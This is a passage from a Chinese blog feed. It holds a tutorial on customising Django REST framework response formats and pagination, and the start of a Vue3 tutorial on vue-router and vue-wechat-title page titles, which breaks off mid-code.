        <content type="html"><![CDATA[<p>在前后端分离是大趋势的背景下，前端获取数据都是通过调用后台的接口来获取数据微服务的应用越来越多。Django是Python进行web应用开发常用的web框架，用Django框架进行web应用框架减少了很多工作，通常用很少量的代码就可以实现数据的增、删、改、查的业务应用，同样用Django的restframework的框架对外发布接口也是非常的简单方便，几行代码就可以将数据对象通过接口的方式提供服务。因为在实际开发过程中接口的返回数据有一定的格式，本文介绍通过自定义Response返回对象来自定义接口返回数据格式。</p><p>以下示例将数据对象Friend通过restframework框架进行接口发布。<br>只要定义Friend数据对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Friend</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    id=models.AutoField(primary_key=<span class="literal">True</span>)</span><br><span class="line">    siteName=models.CharField(max_length=<span class="number">20</span>, verbose_name=<span class="string">'友链站点名称'</span>)</span><br><span class="line">    path=models.CharField(max_length=<span class="number">100</span>, verbose_name=<span class="string">'地址路径'</span>)</span><br><span class="line">    desc=models.CharField(max_length=<span class="number">200</span>, verbose_name=<span class="string">'描述'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.siteName</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        verbose_name=<span class="string">'友链'</span></span><br><span class="line">        verbose_name_plural=<span class="string">'友链'</span></span><br></pre></td></tr></table></figure><p>定义一个序列化类将返回的字段序列化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FriendModelSerializer</span><span class="params">(serializers.ModelSerializer)</span>:</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = Friend</span><br><span class="line">        fields = <span class="string">"__all__"</span></span><br></pre></td></tr></table></figure><p>定义一个接口视图类获取数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FriendView</span><span class="params">(viewsets.ModelViewSet)</span>:</span></span><br><span class="line">    queryset = Friend.objects.all()</span><br><span class="line">    serializer_class = FriendModelSerializer</span><br></pre></td></tr></table></figure><p>定义接口路由就可以通过httprestfull的接口进行访问了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">friend_list=views.FriendView.as_view(&#123;<span class="string">'get'</span>:<span class="string">'list'</span>,&#125;)</span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'friend/'</span>,friend_list),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>接口访问效果如下：<br><a href="http://localhost:8000/api/friend/" target="_blank" rel="noopener">http://localhost:8000/api/friend/</a><br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220713/%E6%8E%A5%E5%8F%A3%E5%8F%91%E5%B8%83.png" alt="httprestfull的接口"></p><p>但是在项目中经常会碰到接口格式变化的情况，restframework框架默认的返回数据格式不满足应用的需求。比如一般的接口都会有接口返回的code、msg、data，code用来标识接口返回代码比如200是正常，msg用来记录异常或其信息，data用来返回具体的数据。<br>通过restframework接口自定义返回数据格式也是很简单方便的。<br>先自定义Response返回对象，在返回对象中自定义数据返回的格式，示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.response <span class="keyword">import</span> Response</span><br><span class="line"><span class="keyword">from</span> rest_framework.serializers <span class="keyword">import</span> Serializer</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CustomResponse</span><span class="params">(Response)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,data=None,code=None,msg=None,</span></span></span><br><span class="line"><span class="function"><span class="params">                 status=None,</span></span></span><br><span class="line"><span class="function"><span class="params">                 template_name=None, headers=None,</span></span></span><br><span class="line"><span class="function"><span class="params">                 exception=False, content_type=None,**kwargs)</span>:</span></span><br><span class="line">        super().__init__(<span class="literal">None</span>, status=status)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> isinstance(data, Serializer):</span><br><span class="line">            msg = (</span><br><span class="line">                <span class="string">'You passed a Serializer instance as data, but '</span></span><br><span class="line">                <span class="string">'probably meant to pass serialized `.data` or '</span></span><br><span class="line">                <span class="string">'`.error`. representation.'</span></span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">raise</span> AssertionError(msg)</span><br><span class="line">        <span class="comment">#自定义返回格式</span></span><br><span class="line">        self.data=&#123;<span class="string">'code'</span>:code,<span class="string">'msg'</span>:msg,<span class="string">'data'</span>:data&#125;</span><br><span class="line">        self.data.update(kwargs)</span><br><span class="line">        self.template_name=template_name</span><br><span class="line">        self.exception=exception</span><br><span class="line">        self.content_type=content_type</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> headers:</span><br><span class="line">            <span class="keyword">for</span> name, value <span class="keyword">in</span> headers.items():</span><br><span class="line">                self[name] = value</span><br></pre></td></tr></table></figure><p>在接口接口视图类获取数据返回时，使用该自定义的Response返回对象。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FriendView</span><span class="params">(viewsets.ModelViewSet)</span>:</span></span><br><span class="line">    queryset = Friend.objects.all()</span><br><span class="line">    serializer_class = FriendModelSerializer</span><br><span class="line">    <span class="comment">#自定义list方法，自定义Response返回</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">list</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        queryset = self.filter_queryset(self.get_queryset())</span><br><span class="line">        serializer = self.get_serializer(queryset, many=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">return</span> CustomResponse(data=serializer.data, code=<span class="number">200</span>, msg=<span class="string">"OK"</span>, status=status.HTTP_200_OK)</span><br></pre></td></tr></table></figure><p>接口访问效果如下：<br>可以看到返回数据格式中增加了code,msg 数据放到了data节点<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220713/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8E%A5%E5%8F%A3%E8%BF%94%E5%9B%9E%E6%95%B0%E6%8D%AE1.png" alt="自定义数据返回格式"></p><p>列表数据通常接口要提供翻页功能，在接口中要有总页数、当前页、是否有下一页的信息。<br>可以自定义一个分页器，在分页器中自定义需要返回的分页参数<br>参考示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> status</span><br><span class="line"><span class="keyword">from</span> rest_framework.pagination <span class="keyword">import</span> PageNumberPagination</span><br><span class="line"><span class="keyword">from</span> common.customresponse <span class="keyword">import</span> CustomResponse</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyPage</span><span class="params">(PageNumberPagination)</span>:</span></span><br><span class="line">    page_size = <span class="number">8</span> <span class="comment">#每页显示数量</span></span><br><span class="line">    max_page_size = <span class="number">50</span> <span class="comment">#每页最大显示数量。</span></span><br><span class="line">    page_size_query_param = <span class="string">'size'</span> <span class="comment">#每页数量的参数名称</span></span><br><span class="line">    page_query_param = <span class="string">'page'</span>  <span class="comment">#页码的参数名称</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_paginated_response</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="comment">#自定义分页器的返回参数</span></span><br><span class="line">        <span class="keyword">return</span> CustomResponse(data=data,code=<span class="number">200</span>,msg=<span class="string">"OK"</span>,status=status.HTTP_200_OK, count=self.page.paginator.count,next=self.get_next_link(),previous=self.get_previous_link(),size=self.page_size,page=self.page.number)</span><br></pre></td></tr></table></figure><p>在接口接口视图类获取数据返回时，如果有分页器则使用该分页器自定义的Response返回对象。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FriendView</span><span class="params">(viewsets.ModelViewSet)</span>:</span></span><br><span class="line">    queryset = Friend.objects.all()</span><br><span class="line">    serializer_class = FriendModelSerializer</span><br><span class="line">    pagination_class = MyPage</span><br><span class="line">    <span class="comment">#自定义list方法，自定义Response返回</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">list</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        queryset = self.filter_queryset(self.get_queryset())</span><br><span class="line">        page = self.paginate_queryset(queryset)</span><br><span class="line">        <span class="comment">#如果有分页器，则进行分页后返回</span></span><br><span class="line">        <span class="keyword">if</span> page <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            serializer = self.get_serializer(page, many=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">return</span> self.get_paginated_response(serializer.data)</span><br><span class="line"></span><br><span class="line">        serializer = self.get_serializer(queryset, many=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">return</span> CustomResponse(data=serializer.data, code=<span class="number">200</span>, msg=<span class="string">"OK"</span>, status=status.HTTP_200_OK)</span><br></pre></td></tr></table></figure><p>接口访问效果如下：<br>可以看到接口中自定义增加了分页信息。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220713/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8E%A5%E5%8F%A3%E8%BF%94%E5%9B%9E%E6%95%B0%E6%8D%AE2-%E5%88%86%E9%A1%B5%E4%BF%A1%E6%81%AF.png" alt="接口中自定义增加了分页信息"></p><p>但是有时候可能希望分页的信息数据要放在data节点里面，这样也是可以做到的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> status</span><br><span class="line"><span class="keyword">from</span> rest_framework.pagination <span class="keyword">import</span> PageNumberPagination</span><br><span class="line"><span class="keyword">from</span> common.customresponse <span class="keyword">import</span> CustomResponse</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyPage</span><span class="params">(PageNumberPagination)</span>:</span></span><br><span class="line">    page_size = <span class="number">8</span> <span class="comment">#每页显示数量</span></span><br><span class="line">    max_page_size = <span class="number">50</span> <span class="comment">#每页最大显示数量。</span></span><br><span class="line">    page_size_query_param = <span class="string">'size'</span> <span class="comment">#每页数量的参数名称</span></span><br><span class="line">    page_query_param = <span class="string">'page'</span>  <span class="comment">#页码的参数名称</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#自定义分页器的返回参数</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_paginated_response</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        ret_data = dict()</span><br><span class="line">        ret_data[<span class="string">'items'</span>] = data</span><br><span class="line">        <span class="comment"># 加入自定义分页信息</span></span><br><span class="line">     ret_data[<span class="string">'total'</span>] = self.page.paginator.count</span><br><span class="line">        ret_data[<span class="string">'hasNextPage'</span>] = self.get_next_link()</span><br><span class="line">        ret_data[<span class="string">'size'</span>] = self.page_size</span><br><span class="line">        ret_data[<span class="string">'page'</span>] = self.page.number</span><br><span class="line">        <span class="keyword">return</span> CustomResponse(data=ret_data,code=<span class="number">200</span>,msg=<span class="string">"OK"</span>,status=status.HTTP_200_OK)</span><br></pre></td></tr></table></figure><p>接口访问效果如下：<br>可以看到接口中自定义增加了分页信息，分页的信息数据放在data节点里面了<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220713/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8E%A5%E5%8F%A3%E8%BF%94%E5%9B%9E%E6%95%B0%E6%8D%AE3-%E5%88%86%E9%A1%B5%E4%BF%A1%E6%81%AF%E5%9C%A8data%E9%87%8C.png" alt="自定义增加了分页信息，分页的信息数据放在data节点里面"><br>至此，本文介绍了通过Django的restframework接口框架自定义Response返回对象来自定义返回数据格式。Django的restframework接口框架使用简单方便，拿来即用，能够很大程度上减少代码开发量。</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue3引入vue-router路由并通过vue-wechat-title设置页面title</title>
      <link href="/posts/5b619f34/"/>
      <url>/posts/5b619f34/</url>
      
        <content type="html"><![CDATA[<p>对于用类似Vue前后端分离技术架构的单页应用页面之间的跳转没有非前后端分离那么来得直接，甚至连设置跳转页面的Title都要费一番周折，本文介绍Vue3引入vue-router路由并设置页面Title，通过vue-router实现页面的路由，通过vue-wechat-title来设置页面的title。</p><h1 id="一、用vue-router库实现路由管理"><a href="#一、用vue-router库实现路由管理" class="headerlink" title="一、用vue-router库实现路由管理"></a>一、用vue-router库实现路由管理</h1><p>vue-router是Vue.js官方推荐的路由管理库。它和Vue.js的核心深度集成，让构建单页应用变得轻松容易。使用Vue.js和vue-router库创建单页应用非常的简单：使用Vue.js开发，整个应用已经被拆分成了独立的组件；使用vue-router库，可以把路由映射到各个组件，并把各个组件渲染到正确的地方。下面就来介绍如何安装引入vue-router库并实现路由管理</p><h2 id="1、安装vue-router库"><a href="#1、安装vue-router库" class="headerlink" title="1、安装vue-router库"></a>1、安装vue-router库</h2><p>使用如下命令安装vue-router库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -save -vue-router</span><br></pre></td></tr></table></figure><p>也可以通过  <code>npm install -save vue-router@4</code> 来指定版本号@4表示版本是4<br>安装成功后，可以在控制台看到了安装成功的信息和版本号<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220703/Vue3%E5%BC%95%E5%85%A5vue-router%E8%B7%AF%E7%94%B1%E5%B9%B6%E9%80%9A%E8%BF%87vue-wechat-title%E8%AE%BE%E7%BD%AE%E9%A1%B5%E9%9D%A2Title/%E5%AE%89%E8%A3%85vue-route%E5%BA%93.png" alt="控制台看到了安装成功的信息和版本号"><br>除此之外也可以在工程中的package.json中看到依赖的库中包含有vue-router及版本号。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220703/Vue3%E5%BC%95%E5%85%A5vue-router%E8%B7%AF%E7%94%B1%E5%B9%B6%E9%80%9A%E8%BF%87vue-wechat-title%E8%AE%BE%E7%BD%AE%E9%A1%B5%E9%9D%A2Title/%E6%9F%A5%E7%9C%8Bvue-route%E7%89%88%E6%9C%AC.png" alt="package.json中看到依赖的库中包含有vue-router及版本号"></p><h2 id="2、在router文件夹下创建router-js"><a href="#2、在router文件夹下创建router-js" class="headerlink" title="2、在router文件夹下创建router.js"></a>2、在router文件夹下创建router.js</h2><p>在工程的src目录下建立router文件夹 在router文件夹下创建router.js，该文件是Vue路由管理的核心文件，所有的各组件的路由在该文件中进行配置。<br>参考代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createRouter,createWebHistory &#125; <span class="keyword">from</span> <span class="string">"vue-router"</span>; <span class="comment">//引入vue-router组件</span></span><br><span class="line"><span class="keyword">import</span> HelloWorld <span class="keyword">from</span> <span class="string">'@/components/HelloWorld'</span>;           <span class="comment">//引入需要路由管理的页面组件HelloWorld</span></span><br><span class="line"><span class="keyword">import</span> siteLogin <span class="keyword">from</span> <span class="string">'@/views/user/login'</span>;                 <span class="comment">//引入需要路由管理的页面组件login</span></span><br><span class="line"><span class="keyword">import</span> userInfo <span class="keyword">from</span> <span class="string">"@/views/user/userinfo"</span>;               <span class="comment">//引入需要路由管理的页面组件userinfo</span></span><br><span class="line"><span class="keyword">const</span> router = createRouter(&#123;</span><br><span class="line">    history:createWebHistory(),</span><br><span class="line">    routes:[</span><br><span class="line">        &#123;</span><br><span class="line">            path:<span class="string">'/'</span>,              <span class="comment">//路由的路径</span></span><br><span class="line">            name:<span class="string">'Home'</span>,           <span class="comment">//路由的名称</span></span><br><span class="line">            component:HelloWorld,  <span class="comment">//路由的组件</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            path:<span class="string">'/login'</span>,</span><br><span class="line">            name:<span class="string">'Login'</span>,</span><br><span class="line">            component:siteLogin,</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            path:<span class="string">'/userinfo'</span>,</span><br><span class="line">            name:<span class="string">'UserInfo'</span>,</span><br><span class="line">            component:userInfo,</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router;</span><br></pre></td></tr></table></figure><p>代码组织结构如下：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220703/Vue3%E5%BC%95%E5%85%A5vue-router%E8%B7%AF%E7%94%B1%E5%B9%B6%E9%80%9A%E8%BF%87vue-wechat-title%E8%AE%BE%E7%BD%AE%E9%A1%B5%E9%9D%A2Title/%E4%BB%A3%E7%A0%81%E7%BB%93%E6%9E%84.png" alt="代码组织结构如下"></p><h2 id="3、在App-vue中加入路由视图"><a href="#3、在App-vue中加入路由视图" class="headerlink" title="3、在App.vue中加入路由视图"></a>3、在App.vue中加入路由视图</h2><p>在App.vue中加入<code>&lt;router-view /&gt;</code><br>App.vue示例代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id=<span class="string">"app"</span>&gt;</span><br><span class="line">    &lt;router-view /&gt;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  name: <span class="string">'App'</span>,</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;style&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>style&gt;</span><br></pre></td></tr></table></figure><h2 id="4、在项目的main-js中引入路由"><a href="#4、在项目的main-js中引入路由" class="headerlink" title="4、在项目的main.js中引入路由"></a>4、在项目的main.js中引入路由</h2><p>参考代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">'vue'</span>;</span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">'./App.vue'</span>;</span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">"@/router/router"</span>;  <span class="comment">//引入路由，会去找router下的router.js的配置文件</span></span><br><span class="line">createApp(App).use(router).mount(<span class="string">'#app'</span>)  <span class="comment">//创建应用的时候应用路由</span></span><br></pre></td></tr></table></figure><h2 id="5、验证效果"><a href="#5、验证效果" class="headerlink" title="5、验证效果"></a>5、验证效果</h2><p>为了显示更清楚，将默认创建的src\components\HelloWorld.vue内容稍加调整</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div &gt;</span><br><span class="line">    第一个路由组件Home</span><br><span class="line">    &lt;p&gt;&#123;&#123; name &#125;&#125;&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">&lt;<span class="regexp">/template&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">export default &#123;</span></span><br><span class="line"><span class="regexp">  name: 'HelloWorld',</span></span><br><span class="line"><span class="regexp">  data() &#123;</span></span><br><span class="line"><span class="regexp">    return &#123;</span></span><br><span class="line"><span class="regexp">      name:"Hello World!"</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br><span class="line">&lt;!-- Add <span class="string">"scoped"</span> attribute to limit CSS to <span class="keyword">this</span> component only --&gt;</span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">&lt;<span class="regexp">/style&gt;</span></span><br></pre></td></tr></table></figure><p>如果上面的步骤没有遗漏，在终端输入 npm run serve 将前端服务启动起来，在浏览器访问localhost:8080可以看到如下页面：</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220703/Vue3%E5%BC%95%E5%85%A5vue-router%E8%B7%AF%E7%94%B1%E5%B9%B6%E9%80%9A%E8%BF%87vue-wechat-title%E8%AE%BE%E7%BD%AE%E9%A1%B5%E9%9D%A2Title/home%E8%B7%AF%E7%94%B1.png" alt="localhost:8080"></p><p>访问localhost:8080/login</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220703/Vue3%E5%BC%95%E5%85%A5vue-router%E8%B7%AF%E7%94%B1%E5%B9%B6%E9%80%9A%E8%BF%87vue-wechat-title%E8%AE%BE%E7%BD%AE%E9%A1%B5%E9%9D%A2Title/login.png" alt="访问localhost:8080/login"></p><p>访问localhost:8080/userinfo</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220703/Vue3%E5%BC%95%E5%85%A5vue-router%E8%B7%AF%E7%94%B1%E5%B9%B6%E9%80%9A%E8%BF%87vue-wechat-title%E8%AE%BE%E7%BD%AE%E9%A1%B5%E9%9D%A2Title/userinfo.png" alt="访问localhost:8080/userinfo"><br>可以看到访问不同的URL路由到了不同的Vue页面，上述login.vue和userinfo.vue示例代码没有给出，大家可以自行随便实现。</p><h1 id="二、用vue-wechat-title实现页面title的设置"><a href="#二、用vue-wechat-title实现页面title的设置" class="headerlink" title="二、用vue-wechat-title实现页面title的设置"></a>二、用vue-wechat-title实现页面title的设置</h1><p>在上面实现了不同页面的路由管理，但是访问不同的URL看到的页面title所有的页面都是一样的，如何设置不同页面不同的页面Title呢？比较方便的做法是用vue-wechat-title来实现。<br>同样首先要安装vue-wechat-title库</p><h2 id="1、安装vue-wechat-title库"><a href="#1、安装vue-wechat-title库" class="headerlink" title="1、安装vue-wechat-title库"></a>1、安装vue-wechat-title库</h2><p>使用如下命令安装vue-wechat-title库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install vue-wechat-title -save</span><br></pre></td></tr></table></figure><p>安装完成后在工程中的package.json中看到依赖的库中包含有vue-wechat-title及版本号<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220703/Vue3%E5%BC%95%E5%85%A5vue-router%E8%B7%AF%E7%94%B1%E5%B9%B6%E9%80%9A%E8%BF%87vue-wechat-title%E8%AE%BE%E7%BD%AE%E9%A1%B5%E9%9D%A2Title/vue-wecha-title.png" alt="package.json中看到依赖的库中包含有vue-wechat-title及版本号"></p><h2 id="2、在router文件夹下的router-js中增加title的配置"><a href="#2、在router文件夹下的router-js中增加title的配置" class="headerlink" title="2、在router文件夹下的router.js中增加title的配置"></a>2、在router文件夹下的router.js中增加title的配置</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createRouter,createWebHistory &#125; <span class="keyword">from</span> <span class="string">"vue-router"</span>; <span class="comment">//引入vue-router组件</span></span><br><span class="line"><span class="keyword">import</span> HelloWorld <span class="keyword">from</span> <span class="string">'@/components/HelloWorld'</span>;           <span class="comment">//引入需要路由管理的页面组件HelloWorld</span></span><br><span class="line"><span class="keyword">import</span> siteLogin <span class="keyword">from</span> <span class="string">'@/views/user/login'</span>;                 <span class="comment">//引入需要路由管理的页面组件login</span></span><br><span class="line"><span class="keyword">import</span> userInfo <span class="keyword">from</span> <span class="string">"@/views/user/userinfo"</span>;               <span class="comment">//引入需要路由管理的页面组件userinfo</span></span><br><span class="line"><span class="keyword">const</span> router = createRouter(&#123;</span><br><span class="line">    history:createWebHistory(),</span><br><span class="line">    routes:[</span><br><span class="line">        &#123;</span><br><span class="line">            path:<span class="string">'/'</span>,              <span class="comment">//路由的路径</span></span><br><span class="line">            name:<span class="string">'Home'</span>,           <span class="comment">//路由的名称</span></span><br><span class="line">            meta:&#123;</span><br><span class="line">                title: <span class="string">'首页'</span>       <span class="comment">//title配置</span></span><br><span class="line">            &#125;,</span><br><span class="line">            component:HelloWorld,  <span class="comment">//路由的组件</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">    